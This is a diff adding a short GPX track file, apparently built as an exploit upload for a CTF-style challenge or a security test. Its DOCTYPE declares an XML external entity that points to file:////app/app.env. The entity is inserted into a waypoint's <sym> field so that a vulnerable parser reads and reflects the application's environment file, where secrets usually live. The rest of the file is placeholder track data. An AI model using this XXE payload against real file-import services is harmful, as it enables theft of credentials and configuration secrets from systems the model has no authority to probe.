@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE sym [<!ENTITY test SYSTEM 'file:////app/app.env'>]>
+<gpx xmlns="http://www.topografix.com/GPX/1/1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd" version="1.1" creator="test">
+<wpt lat="65.938" lon="84.09729999999999">
+<ele>650.4</ele>
+<time>2024-04-03T00:12:51.294446</time>
+<name>a</name>
+<desc>b</desc>
+<sym>&test;</sym>
+</wpt>
+<trk>
+<trkseg>
+<trkpt lat="65.937" lon="84.0983">
+<ele>650</ele>
+<time>2024-04-03T00:12:23.294446</time>
+</trkpt>
+<trkpt lat="65.938" lon="84.09729999999999">
+<ele>650.4</ele>
+<time>2024-04-03T00:12:51.294446</time>
+</trkpt>
+</trkseg>
+</trk>
+</gpx>
